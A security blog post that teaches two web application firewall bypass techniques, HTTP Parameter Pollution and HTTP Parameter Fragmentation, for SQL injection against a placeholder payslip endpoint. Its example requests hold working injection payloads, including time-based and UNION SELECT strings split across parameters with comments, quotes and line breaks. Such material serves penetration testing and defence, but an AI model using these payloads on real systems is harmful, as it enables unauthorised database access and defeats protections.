---
layout: post
title: 'Bypassing WAF by Playing with Parameters'
tags: [Web Security, SQL Injection, Bypassing WAF]
---

In this post, I'll explain two similar techniques that can be used to bypass Web Application Firewalls (WAF). These are HTTP Parameter Pollution (HPP) and HTTP Parameter Fragmentation (HPF). While HPP is a well known technique, its detection among WAFs is strong too. HPF is a technique that I have personally used in pentesting engagements to bypass WAFs. Though detection of HPF is difficult, the pre-requisites for it are even more difficult to spot, which makes this attack a rare find. In this post, I'll first cover how bypassing WAF with HPP would work and then we'll dig deep in HPF technique's exploitation.

## HTTP Parameter Pollution

First let's cover the basics of HTTP Parameter Pollution (HPP). When we send a request to the server, there are usually two separate components that are processing the request- the WAF and the webserver. WAF is trying to analyse the request content in order to identify signatures of known attacks. If there's no signature match then request is allowed and it proceeds further to the webserver. If there's a difference in how the WAF is processing request content and how webserver is processing it then we as attackers can leverage this difference to bypass the restrictions of WAF.

How? Let's see an example. Consider this request:

```http
POST /payslip HTTP/1.1
Host: vulnerable.dev
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 49

{
    "month" : "March",
    "year" : "2010"
}
```

Consider the parameter `month` is vulnerable to SQL Injection. We enter a payload in `month` parameter like `March' and sleep(5) --`, but it gets blocked by the WAF. Now, imagine we send a request with two `month` parameters, something like this:

```http
POST /payslip HTTP/1.1
Host: vulnerable.dev
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 73

{
    "month" : "March",
    "year" : "2010",
    "month" : "April"
}
```

We notice that the application prints the payslip for April month, meaning the application ignores the first instance of `month` parameter and picks the value of second one.

HPP attack would exist here if the WAF is picks the first value of `month` parameter, ignoring the second one. What we have to do is pass on a valid value in first `month` parameter and pass our payload in second `month` parameter. WAF will pick the first one, will find it valid and let the request pass. Then webserver will pick the second value which contains our payload and execute. Our request that will bypass the WAF would look like this:

```http
POST /payslip HTTP/1.1
Host: vulnerable.dev
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 87

{
    "month" : "March",
    "year" : "2010",
    "month" : "April' and 1=1 -- a"
}
```

Different webservers act differently. Some of them picks second instance of parameter, some of them would pick first, some of them would concatenate them. Table shown below (taken from [Appsec EU 2009 Carettoni & Paola](https://owasp.org/www-pdf-archive/AppsecEU09_CarettoniDiPaola_v0.8.pdf)) lists this behavior for common webservers.

![Image](/img/blog/2020/hpp-hpf/1.jpg){: .center-block :}

HPP, however, is a well known technique and most WAFs are configured to catch these kind of attacks. You'd rarely find a working HPP. There's another sister technique to this called HTTP Parameter Fragmentation. Let's cover this technique now.

## HTTP Parameter Fragmentation

Since HTTP Parameter Fragmentation (HPF) is the heart of this article, I'll explain it in detail. But first let's understand the problem statement and requirements of HPF.

### Problem Statement

The problem that we're trying to solve here is similar to what we had in HPP- a WAF in front of vulnerable web application. We have noticed that WAF blocks SQL Injection payloads in user input and we have to bypass this restriction. We have already tried HPP but WAF is smart enough to detect it.

### Requirements

The first and foremost requirement is that you should have two (or more) parameters in the same request vulnerable to an attack (like SQL Injection). Second requirement is that both of them should get used by backend in single operation (like an SQL query).

This may look confusing, so let's directly jump to the example for better clarity. Consider the following request:

```http
POST /payslip HTTP/1.1
Host: vulnerable.dev
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 49

{
    "year" : "2010",
    "month" : "March"
}
```

We find that both `month` and `year` are vulnerable to SQL injection. From this request we can take an assumption that the SQL query running in background would look something like this:

```sql
SELECT * FROM payslips WHERE year = '$year' AND month = '$month'
```

To confirm this assumption, we can try various payloads. If we have error based SQL Injection then obvious choice would be to observe the error message. When we'll put a single quote and a double quote in `year` parameter (like `year=2010'"`), we should observe an error message like this:

{: .box-error}
Error: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near `'"' AND month = 'March''` at line 1

This should confirm that we indeed have both the parameters being used in single query. If we can't see the error messages, then you can play around with some boolean conditions to judge this. For instance, the results of

```sql
SELECT * FROM payslips WHERE year='2010' OR 1=1 AND month='March' AND 1=2
```

should be different from

```sql
SELECT * FROM payslips WHERE year='2010' AND 1=2 AND month='March' OR 1=1
```

You can also use SQL comments. Results of

```sql
SELECT * FROM payslips WHERE year='2010' AND month='March' --
```

should be different from

```sql
SELECT * FROM payslips WHERE year='2010' -- AND month='March'
```

There should be other methods too. You just need to think creatively.

### The Attack

By now the requirements and examples used above should clear some air around this attack. The crux of this attack is to **divide the payload** between two parameters. By doing so, WAF will not be able to detect SQL Injection signatures in value of any parameter, thus bypassing the WAF.

Let's assume following parameters are being blocked by WAF:

```json
{
    "year" : "2010",
    "month" : "March' AND 1=2 UNION SELECT 1,2 -- "
}
```

After a lot of hit and trial, we noticed that WAF blocks the request when a parameter's value matches `' ... UNION SELECT ...`. We already know both `year` and `month` is being used in the query. We can split our payload in these parameters. Look at following parameters:

```json
{
    "year" : "2010' AND 1=2 UNION /*",
    "month" : "*/ SELECT 1,2 -- "
}
```

With these values, the query would effectively look like:

```sql
SELECT * FROM payslips WHERE year='2010' AND 1=2 UNION /* AND month='*/ SELECT 1,2 -- '
```

Notice how multi-line comment is cleverly used to our advantage. None of our parameters now match the `' ... UNION SELECT ...` pattern, thus the request would pass through the WAF. If SQL comments (`/*` or `*/`) is blocked by WAF then you can use open ended quotes to enclose part of the query we would have commented. The parameters should look like this:

```json
{
    "year" : "2010' AND 1=2 AND 'abc' <> \"xyz",
    "month" : "\" UNION SELECT 1,2 -- "
}
```

The query would look like:

```sql
SELECT * FROM payslips WHERE year='2010' AND 1=2 AND 'abc' <> "xyz AND month='" UNION SELECT 1,2 -- '
```

Notice how the part of query that contains `month` is now part of a string, like it was part of the comment above. While this will not work when WAF blocks a pattern like `' ... UNION SELECT ...`, this trick can nonetheless be used in bypassing other kind of restrictions.

### Demonstration

Now that we have covered all the theory required to understand this attack, let me show you a practical demonstration of this attack. We have following request in hand:

![Image](/img/blog/2020/hpp-hpf/2.jpg){: .center-block :}

Let's attempt a normal UNION based SQL injection here. We figure out there are 4 columns in the table, but when we run our UNION payload, we get blocked by the WAF:

![Image](/img/blog/2020/hpp-hpf/3.jpg){: .center-block :}

After some attempts, we realise the WAF is blocking `union select` and `union all select`. We can try to add comments in between, but no help:

![Image](/img/blog/2020/hpp-hpf/4.jpg){: .center-block :}

We'll now try to use HPF here and see if it can help us. Let's first confirm which parameter comes first in query. I'll do so by inspecting the error messages.

![Image](/img/blog/2020/hpp-hpf/5.jpg){: .center-block :}

From the error message we can confirm that `year` parameter comes before `month` in the SQL query. Now we have to split our whole payload between these two parameters:

![Image](/img/blog/2020/hpp-hpf/6.jpg){: .center-block :}

Voila! We have successfully bypassed the WAF and executed the UNION payload we wanted.

**Bonus**: SQL queries can tolerate CR/LFs in queries. We can leverage this in our scenario when a combination to two words (`union` and `select` here) are getting blocked and SQL multi-line comments are also blocked:

![Image](/img/blog/2020/hpp-hpf/7.jpg){: .center-block :}
